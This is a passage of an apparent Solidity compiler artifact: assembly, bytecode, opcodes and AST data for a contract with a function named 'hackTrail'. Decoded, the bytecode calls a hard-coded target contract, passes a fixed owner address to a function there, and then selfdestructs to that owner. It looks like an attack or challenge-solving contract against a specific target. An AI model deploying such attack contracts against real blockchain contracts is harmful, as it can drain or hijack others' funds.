add\n        /* \"#utility.yul\":1360:1412   */\n      tag_30\n      jump\t// in\n    tag_54:\n        /* \"#utility.yul\":1437:1443   */\n      dup1\n        /* \"#utility.yul\":1432:1435   */\n      dup5\n        /* \"#utility.yul\":1428:1444   */\n      add\n        /* \"#utility.yul\":1421:1444   */\n      swap2\n      pop\n        /* \"#utility.yul\":1185:1450   */\n      pop\n        /* \"#utility.yul\":1077:1450   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1456:1727   */\n    tag_9:\n        /* \"#utility.yul\":1586:1589   */\n      0x00\n        /* \"#utility.yul\":1608:1701   */\n      tag_56\n        /* \"#utility.yul\":1697:1700   */\n      dup3\n        /* \"#utility.yul\":1688:1694   */\n      dup5\n        /* \"#utility.yul\":1608:1701   */\n      tag_31\n      jump\t// in\n    tag_56:\n        /* \"#utility.yul\":1601:1701   */\n      swap2\n      pop\n        /* \"#utility.yul\":1718:1721   */\n      dup2\n        /* \"#utility.yul\":1711:1721   */\n      swap1\n      pop\n        /* \"#utility.yul\":1456:1727   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1733:1902   */\n    tag_32:\n        /* \"#utility.yul\":1817:1828   */\n      0x00\n        /* \"#utility.yul\":1851:1857   */\n      dup3\n        /* \"#utility.yul\":1846:1849   */\n      dup3\n        /* \"#utility.yul\":1839:1858   */\n      mstore\n        /* \"#utility.yul\":1891:1895   */\n      0x20\n        /* \"#utility.yul\":1886:1889   */\n      dup3\n        /* \"#utility.yul\":1882:1896   */\n      add\n        /* \"#utility.yul\":1867:1896   */\n      swap1\n      pop\n        /* \"#utility.yul\":1733:1902   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1908:2089   */\n    tag_33:\n        /* \"#utility.yul\":2048:2081   */\n      0x6c6f6c20686f772064696420796f75206576656e2066696e6420746869733f00\n        /* \"#utility.yul\":2044:2045   */\n      0x00\n        /* \"#utility.yul\":2036:2042   */\n      dup3\n        /* \"#utility.yul\":2032:2046   */\n      add\n        /* \"#utility.yul\":2025:2082   */\n      mstore\n        /* \"#utility.yul\":1908:2089   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2095:2461   */\n    tag_34:\n        /* \"#utility.yul\":2237:2240   */\n      0x00\n        /* \"#utility.yul\":2258:2325   */\n      tag_60\n        /* \"#utility.yul\":2322:2324   */\n      0x1f\n        /* \"#utility.yul\":2317:2320   */\n      dup4\n        /* \"#utility.yul\":2258:2325   */\n      tag_32\n      jump\t// in\n    tag_60:\n        /* \"#utility.yul\":2251:2325   */\n      swap2\n      pop\n        /* \"#utility.yul\":2334:2427   */\n      tag_61\n        /* \"#utility.yul\":2423:2426   */\n      dup3\n        /* \"#utility.yul\":2334:2427   */\n      tag_33\n      jump\t// in\n    tag_61:\n        /* \"#utility.yul\":2452:2454   */\n      0x20\n        /* \"#utility.yul\":2447:2450   */\n      dup3\n        /* \"#utility.yul\":2443:2455   */\n      add\n        /* \"#utility.yul\":2436:2455   */\n      swap1\n      pop\n        /* \"#utility.yul\":2095:2461   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2467:2886   */\n    tag_19:\n        /* \"#utility.yul\":2633:2637   */\n      0x00\n        /* \"#utility.yul\":2671:2673   */\n      0x20\n        /* \"#utility.yul\":2660:2669   */\n      dup3\n        /* \"#utility.yul\":2656:2674   */\n      add\n        /* \"#utility.yul\":2648:2674   */\n      swap1\n      pop\n        /* \"#utility.yul\":2720:2729   */\n      dup2\n        /* \"#utility.yul\":2714:2718   */\n      dup2\n        /* \"#utility.yul\":2710:2730   */\n      sub\n        /* \"#utility.yul\":2706:2707   */\n      0x00\n        /* \"#utility.yul\":2695:2704   */\n      dup4\n        /* \"#utility.yul\":2691:2708   */\n      add\n        /* \"#utility.yul\":2684:2731   */\n      mstore\n        /* \"#utility.yul\":2748:2879   */\n      tag_63\n        /* \"#utility.yul\":2874:2878   */\n      dup2\n        /* \"#utility.yul\":2748:2879   */\n      tag_34\n      jump\t// in\n    tag_63:\n        /* \"#utility.yul\":2740:2879   */\n      swap1\n      pop\n        /* \"#utility.yul\":2467:2886   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2892:3018   */\n    tag_35:\n        /* \"#utility.yul\":2929:2936   */\n      0x00\n        /* \"#utility.yul\":2969:3011   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":2962:2967   */\n      dup3\n        /* \"#utility.yul\":2958:3012   */\n      and\n        /* \"#utility.yul\":2947:3012   */\n      swap1\n      pop\n        /* \"#utility.yul\":2892:3018   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3024:3120   */\n    tag_36:\n        /* \"#utility.yul\":3061:3068   */\n      0x00\n        /* \"#utility.yul\":3090:3114   */\n      tag_66\n        /* \"#utility.yul\":3108:3113   */\n      dup3\n        /* \"#utility.yul\":3090:3114   */\n      tag_35\n      jump\t// in\n    tag_66:\n        /* \"#utility.yul\":3079:3114   */\n      swap1\n      pop\n        /* \"#utility.yul\":3024:3120   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3126:3244   */\n    tag_37:\n        /* \"#utility.yul\":3213:3237   */\n      tag_68\n        /* \"#utility.yul\":3231:3236   */\n      dup2\n        /* \"#utility.yul\":3213:3237   */\n      tag_36\n      jump\t// in\n    tag_68:\n        /* \"#utility.yul\":3208:3211   */\n      dup3\n        /* \"#utility.yul\":3201:3238   */\n      mstore\n        /* \"#utility.yul\":3126:3244   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3250:3472   */\n    tag_22:\n        /* \"#utility.yul\":3343:3347   */\n      0x00\n        /* \"#utility.yul\":3381:3383   */\n      0x20\n        /* \"#utility.yul\":3370:3379   */\n      dup3\n        /* \"#utility.yul\":3366:3384   */\n      add\n        /* \"#utility.yul\":3358:3384   */\n      swap1\n      pop\n        /* \"#utility.yul\":3394:3465   */\n      tag_70\n        /* \"#utility.yul\":3462:3463   */\n      0x00\n        /* \"#utility.yul\":3451:3460   */\n      dup4\n        /* \"#utility.yul\":3447:3464   */\n      add\n        /* \"#utility.yul\":3438:3444   */\n      dup5\n        /* \"#utility.yul\":3394:3465   */\n      tag_37\n      jump\t// in\n    tag_70:\n        /* \"#utility.yul\":3250:3472   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa26469706673582212208aada7c5c11aa14585f8706b7d1d63d95ccd8cf688145a4e5826d0cf545b8ff764736f6c634300080a0033\n}\n",
						"bytecode": {
							"functionDebugData": {},
							"generatedSources": [],
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b50610443806100206000396000f3fe6080604052600436106100225760003560e01c8063157bca60146100ef576100ea565b366100ea57600073cd6a42782d230d7c13a74ddec5dd140e55499df973ffffffffffffffffffffffffffffffffffffffff167f4c228cc7776ff09193dddeaa40b26ebd5d18d89e2b6e01adf9e9d8bfc40dcb166040516020016100859190610288565b6040516020818303038152906040526040516100a1919061031d565b6000604051808303816000865af19150503d80600081146100de576040519150601f19603f3d011682016040523d82523d6000602084013e6100e3565b606091505b5050905050005b600080fd5b3480156100fb57600080fd5b50610104610106565b005b73798349e06c67272465123b91bd88c5d19b8c787873ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614610188576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161017f90610391565b60405180910390fd5b600073cd6a42782d230d7c13a74ddec5dd140e55499df990508073ffffffffffffffffffffffffffffffffffffffff1663548853a073798349e06c67272465123b91bd88c5d19b8c78786040518263ffffffff1660e01b81526004016101ee91906103f2565b600060405180830381600087803b15801561020857600080fd5b505af115801561021c573d6000803e3d6000fd5b5050505073798349e06c67272465123b91bd88c5d19b8c787873ffffffffffffffffffffffffffffffffffffffff16ff5b60007fffffffff0000000000000000000000000000000000000000000000000000000082169050919050565b6102828161024d565b82525050565b600060208201905061029d6000830184610279565b92915050565b600081519050919050565b600081905092915050565b60005b838110156102d75780820151818401526020810190506102bc565b838111156102e6576000848401525b50505050565b60006102f7826102a3565b61030181856102ae565b93506103118185602086016102b9565b80840191505092915050565b600061032982846102ec565b915081905092915050565b600082825260208201905092915050565b7f6c6f6c20686f772064696420796f75206576656e2066696e6420746869733f00600082015250565b600061037b601f83610334565b915061038682610345565b602082019050919050565b600060208201905081810360008301526103aa8161036e565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006103dc826103b1565b9050919050565b6103ec816103d1565b82525050565b600060208201905061040760008301846103e3565b9291505056fea26469706673582212208aada7c5c11aa14585f8706b7d1d63d95ccd8cf688145a4e5826d0cf545b8ff764736f6c634300080a0033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x443 DUP1 PUSH2 0x20 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x22 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x157BCA60 EQ PUSH2 0xEF JUMPI PUSH2 0xEA JUMP JUMPDEST CALLDATASIZE PUSH2 0xEA JUMPI PUSH1 0x0 PUSH20 0xCD6A42782D230D7C13A74DDEC5DD140E55499DF9 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0x4C228CC7776FF09193DDDEAA40B26EBD5D18D89E2B6E01ADF9E9D8BFC40DCB16 PUSH1 0x40 MLOAD PUSH1 0x20 ADD PUSH2 0x85 SWAP2 SWAP1 PUSH2 0x288 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE PUSH1 0x40 MLOAD PUSH2 0xA1 SWAP2 SWAP1 PUSH2 0x31D JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP7 GAS CALL SWAP2 POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0xDE JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0xE3 JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP SWAP1 POP POP STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xFB JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x104 PUSH2 0x106 JUMP JUMPDEST STOP JUMPDEST PUSH20 0x798349E06C67272465123B91BD88C5D19B8C7878 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x188 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x17F SWAP1 PUSH2 0x391 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xCD6A42782D230D7C13A74DDEC5DD140E55499DF9 SWAP1 POP DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x548853A0 PUSH20 0x798349E06C67272465123B91BD88C5D19B8C7878 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x1EE SWAP2 SWAP1 PUSH2 0x3F2 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x208 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x21C JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH20 0x798349E06C67272465123B91BD88C5D19B8C7878 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SELFDESTRUCT JUMPDEST PUSH1 0x0 PUSH32 0xFFFFFFFF00000000000000000000000000000000000000000000000000000000 DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x282 DUP2 PUSH2 0x24D JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x29D PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x279 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x2D7 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x2BC JUMP JUMPDEST DUP4 DUP2 GT ISZERO PUSH2 0x2E6 JUMPI PUSH1 0x0 DUP5 DUP5 ADD MSTORE JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x2F7 DUP3 PUSH2 0x2A3 JUMP JUMPDEST PUSH2 0x301 DUP2 DUP6 PUSH2 0x2AE JUMP JUMPDEST SWAP4 POP PUSH2 0x311 DUP2 DUP6 PUSH1 0x20 DUP7 ADD PUSH2 0x2B9 JUMP JUMPDEST DUP1 DUP5 ADD SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x329 DUP3 DUP5 PUSH2 0x2EC JUMP JUMPDEST SWAP2 POP DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x6C6F6C20686F772064696420796F75206576656E2066696E6420746869733F00 PUSH1 0x0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x37B PUSH1 0x1F DUP4 PUSH2 0x334 JUMP JUMPDEST SWAP2 POP PUSH2 0x386 DUP3 PUSH2 0x345 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x3AA DUP2 PUSH2 0x36E JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x3DC DUP3 PUSH2 0x3B1 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x3EC DUP2 PUSH2 0x3D1 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x407 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x3E3 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 DUP11 0xAD 0xA7 0xC5 0xC1 BYTE LOG1 GASLIMIT DUP6 0xF8 PUSH17 0x6B7D1D63D95CCD8CF688145A4E5826D0CF SLOAD JUMPDEST DUP16 0xF7 PUSH5 0x736F6C6343 STOP ADDMOD EXP STOP CALLER ",
							"sourceMap": "808:701:0:-:0;;;;;;;;;;;;;;;;;;;"
						},
						"deployedBytecode": {
							"functionDebugData": {
								"@_138": {
									"entryPoint": null,
									"id": 138,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"@hackTrail_116": {
									"entryPoint": 262,
									"id": 116,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"abi_encode_t_address_to_t_address_fromStack": {
									"entryPoint": 995,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 0
								},
								"abi_encode_t_bytes4_to_t_bytes4_fromStack": {
									"entryPoint": 633,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 0
								},
								"abi_encode_t_bytes_memory_ptr_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack": {
									"entryPoint": 748,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_encode_t_stringliteral_1180ae7b27b2dbd689cf1e5868291709bfdcaa95087146f0906e60e5fbab5e22_to_t_string_memory_ptr_fromStack": {
									"entryPoint": 878,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"abi_encode_tuple_packed_t_bytes_memory_ptr__to_t_bytes_memory_ptr__nonPadded_inplace_fromStack_reversed": {
									"entryPoint": 797,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_encode_tuple_t_address__to_t_address__fromStack_reversed": {
									"entryPoint": 1010,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_encode_tuple_t_bytes4__to_t_bytes4__fromStack_reversed": {
									"entryPoint": 648,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_encode_tuple_t_stringliteral_1180ae7b27b2dbd689cf1e5868291709bfdcaa95087146f0906e60e5fbab5e22__to_t_string_memory_ptr__fromStack_reversed": {
									"entryPoint": 913,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"array_length_t_bytes_memory_ptr": {
									"entryPoint": 675,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack": {
									"entryPoint": 686,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"array_storeLengthForEncoding_t_string_memory_ptr_fromStack": {
									"entryPoint": 820,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"cleanup_t_address": {
									"entryPoint": 977,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"cleanup_t_bytes4": {
									"entryPoint": 589,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"cleanup_t_uint160": {
									"entryPoint": 945,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"copy_memory_to_memory": {
									"entryPoint": 697,
									"id": null,
									"parameterSlots": 3,
									"returnSlots": 0
								},
								"store_literal_in_memory_1180ae7b27b2dbd689cf1e5868291709bfdcaa95087146f0906e60e5fbab5e22": {
									"entryPoint": 837,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 0
								}
							},
							"generatedSources": [
								{
									"ast": {
										"nodeType": "YulBlock",
										"src": "0:3475:1",
										"statements": [
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "51:105:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "61:89:1",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "76:5:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "83:66:1",
																		"type": "",
																		"value": "0xffffffff00000000000000000000000000000000000000000000000000000000"
																	}
																],
																"functionName": {
																	"name": "and",
																	"nodeType": "YulIdentifier",
																	"src": "72:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "72:78:1"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "61:7:1"
																}
															]
														}
													]
												},
												"name": "cleanup_t_bytes4",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "33:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "43:7:1",
														"type": ""
													}
												],
												"src": "7:149:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "225:52:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "242:3:1"
																	},
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "264:5:1"
																			}
																		],
																		"functionName": {
																			"name": "cleanup_t_bytes4",
																			"nodeType": "YulIdentifier",
																			"src": "247:16:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "247:23:1"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "235:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "235:36:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "235:36:1"
														}
													]
												},
												"name": "abi_encode_t_bytes4_to_t_bytes4_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "213:5:1",
														"type": ""
													},
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "220:3:1",
														"type": ""
													}
												],
												"src": "162:115:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "379:122:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "389:26:1",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "401:9:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "412:2:1",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "397:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "397:18:1"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "389:4:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value0",
																		"nodeType": "YulIdentifier",
																		"src": "467:6:1"
																	},
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "480:9:1"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "491:1:1",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "476:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "476:17:1"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_bytes4_to_t_bytes4_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "425:41:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "425:69:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "425:69:1"
														}
													]
												},
												"name": "abi_encode_tuple_t_bytes4__to_t_bytes4__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "351:9:1",
														"type": ""
													},
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "363:6:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "374:4:1",
														"type": ""
													}
												],
												"src": "283:218:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "565:40:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "576:22:1",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "592:5:1"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nodeType": "YulIdentifier",
																	"src": "586:5:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "586:12:1"
															},
															"variableNames": [
																{
																	"name": "length",
																	"nodeType": "YulIdentifier",
																	"src": "576:6:1"
																}
															]
														}
													]
												},
												"name": "array_length_t_bytes_memory_ptr",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "548:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "length",
														"nodeType": "YulTypedName",
														"src": "558:6:1",
														"type": ""
													}
												],
												"src": "507:98:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "724:34:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "734:18:1",
															"value": {
																"name": "pos",
																"nodeType": "YulIdentifier",
																"src": "749:3:1"
															},
															"variableNames": [
																{
																	"name": "updated_pos",
																	"nodeType": "YulIdentifier",
																	"src": "734:11:1"
																}
															]
														}
													]
												},
												"name": "array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "696:3:1",
														"type": ""
													},
													{
														"name": "length",
														"nodeType": "YulTypedName",
														"src": "701:6:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "updated_pos",
														"nodeType": "YulTypedName",
														"src": "712:11:1",
														"type": ""
													}
												],
												"src": "611:147:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "813:258:1",
													"statements": [
														{
															"nodeType": "YulVariableDeclaration",
															"src": "823:10:1",
															"value": {
																"kind": "number",
																"nodeType": "YulLiteral",
																"src": "832:1:1",
																"type": "",
																"value": "0"
															},
															"variables": [
																{
																	"name": "i",
																	"nodeType": "YulTypedName",
																	"src": "827:1:1",
																	"type": ""
																}
															]
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "892:63:1",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"arguments": [
																						{
																							"name": "dst",
																							"nodeType": "YulIdentifier",
																							"src": "917:3:1"
																						},
																						{
																							"name": "i",
																							"nodeType": "YulIdentifier",
																							"src": "922:1:1"
																						}
																					],
																					"functionName": {
																						"name": "add",
																						"nodeType": "YulIdentifier",
																						"src": "913:3:1"
																					},
																					"nodeType": "YulFunctionCall",
																					"src": "913:11:1"
																				},
																				{
																					"arguments": [
																						{
																							"arguments": [
																								{
																									"name": "src",
																									"nodeType": "YulIdentifier",
																									"src": "936:3:1"
																								},
																								{
																									"name": "i",
																									"nodeType": "YulIdentifier",
																									"src": "941:1:1"
																								}
																							],
																							"functionName": {
																								"name": "add",
																								"nodeType": "YulIdentifier",
																								"src": "932:3:1"
																							},
																							"nodeType": "YulFunctionCall",
																							"src": "932:11:1"
																						}
																					],
																					"functionName": {
																						"name": "mload",
																						"nodeType": "YulIdentifier",
																						"src": "926:5:1"
																					},
																					"nodeType": "YulFunctionCall",
																					"src": "926:18:1"
																				}
																			],
																			"functionName": {
																				"name": "mstore",
																				"nodeType": "YulIdentifier",
																				"src": "906:6:1"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "906:39:1"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "906:39:1"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "i",
																		"nodeType": "YulIdentifier",
																		"src": "853:1:1"
																	},
																	{
																		"name": "length",
																		"nodeType": "YulIdentifier",
																		"src": "856:6:1"
																	}
																],
																"functionName": {
																	"name": "lt",
																	"nodeType": "YulIdentifier",
																	"src": "850:2:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "850:13:1"
															},
															"nodeType": "YulForLoop",
															"post": {
																"nodeType": "YulBlock",
																"src": "864:19:1",
																"statements": [
																	{
																		"nodeType": "YulAssignment",
																		"src": "866:15:1",
																		"value": {
																			"arguments": [
																				{
																					"name": "i",
																					"nodeType": "YulIdentifier",
																					"src": "875:1:1"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "878:2:1",
																					"type": "",
																					"value": "32"
																				}
																			],
																			"functionName": {
																				"name": "add",
																				"nodeType": "YulIdentifier",
																				"src": "871:3:1"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "871:10:1"
																		},
																		"variableNames": [
																			{
																				"name": "i",
																				"nodeType": "YulIdentifier",
																				"src": "866:1:1"
																			}
																		]
																	}
																]
															},
															"pre": {
																"nodeType": "YulBlock",
																"src": "846:3:1",
																"statements": []
															},
															"src": "842:113:1"
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "989:76:1",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"arguments": [
																						{
																							"name": "dst",
																							"nodeType": "YulIdentifier",
																							"src": "1039:3:1"
																						},
																						{
																							"name": "length",
																							"nodeType": "YulIdentifier",
																							"src": "1044:6:1"
																						}
																					],
																					"functionName": {
																						"name": "add",
																						"nodeType": "YulIdentifier",
																						"src": "1035:3:1"
																					},
																					"nodeType": "YulFunctionCall",
																					"src": "1035:16:1"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
